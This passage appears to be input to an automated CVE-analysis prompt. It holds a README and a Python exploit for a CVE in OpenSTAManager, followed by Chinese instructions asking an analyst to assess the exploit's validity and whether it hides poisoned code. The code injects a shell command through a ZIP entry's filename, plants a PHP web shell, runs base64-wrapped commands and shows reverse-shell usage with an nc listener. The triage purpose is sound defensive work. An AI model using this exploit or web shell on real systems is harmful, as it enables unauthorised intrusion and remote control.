RNAME> -P <PASSWORD> -r <LHOST> <LPORT>\n\n\nExamples:\n\nExecute a single command:\n\n```bash\npython3 exploit.py -u http://support_001.enigma.htb -U admin -P 'Password123' -c 'id'\n```\n\nGet a Reverse Shell:\n\n```bash\n# Start your netcat listener in another terminal:\nnc -lvnp 4444\n\n# Run the exploit:\npython3 exploit.py -u http://support_001.enigma.htb -U admin -P 'Password123' -r 10.10.14.1 4444\n```\n\n\n---\n/tmp/7fe491fe4b00ce454c135f34a3453dd7/exploit.py\n---\n#!/usr/bin/env python3\n# CVE-2025-69212 - OpenSTAManager Full Automated Exploit Script with Arguments\n\nimport requests\nimport zipfile\nimport io\nimport sys\nimport argparse\nimport base64\n\ndef login(url, username, password):\n    session = requests.Session()\n    print(\"[+] Logging into OpenSTAManager...\")\n    login_data = {'username': username, 'password': password}\n    resp = session.post(f\"{url}/index.php?op=login\", data=login_data, allow_redirects=True)\n    \n    if \"logout\" in resp.text.lower() or \"dashboard\" in resp.text.lower():\n        print(\"[+] Login successful!\")\n        return session\n    print(\"[-] Login failed! Check credentials.\")\n    return None\n\ndef deploy_webshell(session, url):\n    print(\"[+] Creating malicious ZIP file with command injection...\")\n    cmd = \"cd files && echo '<?php system($_GET[\\\"c\\\"]); ?>' > SHELL.php\"\n    filename = f'invoice.p7m\";{cmd};echo \".p7m'\n    \n    zip_buffer = io.BytesIO()\n    with zipfile.ZipFile(zip_buffer, 'w') as zf:\n        zf.writestr(filename, b\"DUMMY_P7M_CONTENT\")\n    \n    print(\"[+] Uploading malicious ZIP to target...\")\n    files = {'file': ('exploit.zip', zip_buffer.getvalue(), 'application/zip')}\n    \n    upload_paths = [\n        '/modules/importazione_fe/import.php',\n        '/modules/importazione_fe/import.php?op=upload',\n        '/modules/importazione_fe/upload.php',\n        '/index.php?module=importazione_fe&op=upload'\n    ]\n    \n    for path in upload_paths:\n        try:\n            upload_url = f\"{url}{path}\"\n            resp = session.post(upload_url, files=files)\n            if resp.status_code == 200:\n                print(f\"[+] Webshell successfully deployed via: {path}\")\n                return True\n        except Exception:\n            continue\n    \n    print(\"[-] Web shell deployment failed!\")\n    return False\n\ndef execute_command(session, url, cmd):\n    shell_url = f\"{url}/files/SHELL.php\"\n    \n    # විශේෂ අකුරු ආරක්ෂා කර ගැනීමට Base64 Encode කිරීම\n    b64_cmd = base64.b64encode(cmd.encode()).decode()\n    wrapped_cmd = f\"echo {b64_cmd} | base64 -d | bash\"\n    \n    resp = session.get(shell_url, params={'c': wrapped_cmd})\n    return resp.text\n\ndef main():\n    parser = argparse.ArgumentParser(description='CVE-2025-69212 Full Automated Exploit')\n    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://support_001.enigma.htb)')\n    parser.add_argument('-U', '--username', required=True, help='Admin Username')\n    parser.add_argument('-P', '--password', required=True, help='Admin Password')\n    parser.add_argument('-r', '--reverse-shell', nargs=2, metavar=('LHOST', 'LPORT'), \n                        help='Send reverse shell (e.g., -r 10.10.14.1 4444)')\n    parser.add_argument('-c', '--comman\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**